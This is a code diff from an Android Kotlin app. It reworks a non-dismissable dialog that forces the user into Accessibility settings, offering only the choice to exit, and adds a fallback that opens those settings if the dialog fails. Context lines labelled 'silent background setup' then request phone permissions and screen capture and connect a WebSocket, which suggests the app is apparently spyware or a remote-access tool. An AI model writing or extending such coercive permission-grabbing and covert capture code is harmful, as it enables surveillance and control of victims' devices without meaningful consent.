@@ -48,23 +48,27 @@ supportActionBar?.hide()
         
         //silent background setup
       if (!isAccessibilityServiceEnabled()) {
-    val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
-    
-    AlertDialog.Builder(this, R.style.CustomDialog)
-        .setView(dialogView)
-        .setCancelable(false)
-        .create()
-        .apply {
-            dialogView.findViewById<Button>(R.id.btnSettings).setOnClickListener {
-                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-                dismiss()
-            }
-            dialogView.findViewById<Button>(R.id.btnExit).setOnClickListener {
-                finishAffinity()
-            }
-            show()
+    try {
+        val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
+        val dialog = AlertDialog.Builder(this, R.style.CustomDialog)
+            .setView(dialogView)
+            .setCancelable(false)
+            .create()
+        
+        dialogView.findViewById<Button>(R.id.btnSettings)?.setOnClickListener {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+            dialog.dismiss()
         }
-      }
+        dialogView.findViewById<Button>(R.id.btnExit)?.setOnClickListener {
+            finishAffinity()
+        }
+        
+        dialog.show()
+    } catch (e: Exception) {
+        // Fallback for any weird device
+        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+    }
+}
         requestPhonePermission()
         requestScreenCapture()
         webSocketManager.connect()
